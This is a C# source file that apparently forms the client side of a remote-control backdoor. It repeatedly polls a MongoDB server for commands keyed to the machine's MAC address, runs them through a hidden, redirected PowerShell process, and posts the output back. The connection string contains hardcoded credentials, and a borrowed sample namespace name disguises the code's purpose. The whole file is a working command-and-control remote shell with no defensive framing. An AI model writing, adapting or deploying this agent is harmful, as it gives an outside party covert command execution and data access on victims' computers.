using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.Threading;
using System.Net;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using MongoDB.Driver;
using MongoDB.Bson;
using System.Linq;

namespace ProcessAsyncStreamSamples
{
    class Powershell
    {
        // Define static variables shared by class methods.
        private static StringBuilder sendOutput = null;
        public static void CreatePowershellprocess(string databaseip, string databaseport, string mac)
        {
            while (true)
            {
                string inputText = client.infosender.Clientinfosender(mac, databaseip, databaseport);
                if (inputText != null )
                {
                    Process powershell = new Process();
                    powershell.StartInfo.FileName = "PowerShell.exe";
                    powershell.StartInfo.UseShellExecute = false;
                    powershell.StartInfo.RedirectStandardOutput = true;
                    sendOutput = new StringBuilder();
                    powershell.OutputDataReceived += SendOutputHandler;
                    powershell.StartInfo.RedirectStandardInput = true;
                    powershell.Start();
                    StreamWriter StreamWriter = powershell.StandardInput;
                    powershell.BeginOutputReadLine();
                    BsonDocument doc = new BsonDocument();
                    while (true)
                    {
                        sendOutput.Clear();
                        if (!String.IsNullOrEmpty(inputText))
                        {
                            StreamWriter.WriteLine(inputText);
                            Thread.Sleep(3000);
                            var dbClient = new MongoClient("mongodb://client:client99@" + databaseip + ":" + databaseport + "/admin");
                            IMongoDatabase respondsdatabase = dbClient.GetDatabase("responds");
                            var respondscollection = respondsdatabase.GetCollection<BsonDocument>(mac);
                            if (String.IsNullOrEmpty(sendOutput.ToString()))
                            {
                                doc.Add(new BsonElement("respond", "ur command havent any output"));
                            }
                            else
                            {
                                using (StringReader reader = new StringReader(sendOutput.ToString()))
                                {
                                    string line = string.Empty;
                                    int i = 0;
                                    do
                                    {
                                        line = reader.ReadLine();
                                        if (line != null)
                                        {
                                            doc.Add(new BsonElement(i.ToString(), line));
                                            i++;
                                        }

                                    } while (line != null);
                                }

                            }
                            doc.Add(new BsonElement("name", "client"));
                            doc.Add(new BsonElement("command", inputText));
                            respondsdatabase.DropCollection(mac);
                            respondscollection.InsertOne(doc);
                            doc.Clear();
                            IMongoDatabase commandsdatabase = dbClient.GetDatabase("commands");
                            ////creat Mac object
                            var commadscollection = commandsdatabase.GetCollection<BsonDocument>(mac);
                            var filter = Builders<BsonDocument>.Filter.Eq("name", "server");
                            var servercommand = commadscollection.Find(filter).FirstOrDefault();
                            try
                            {
                                inputText = servercommand.ElementAt(2).Value.ToString();
                            }
                            catch
                            {
                                inputText = null;
                                powershell.Close();
                                break;
                            }
                        }
                    }

                }
            }
        }
        private static void SendOutputHandler(object sendingProcess,
            DataReceivedEventArgs outLine)
        {
            // Collect the sort command output.
            if (!String.IsNullOrEmpty(outLine.Data))
            {
                sendOutput.Append(Environment.NewLine +
                    $" {outLine.Data}");
            }
        }
    }
}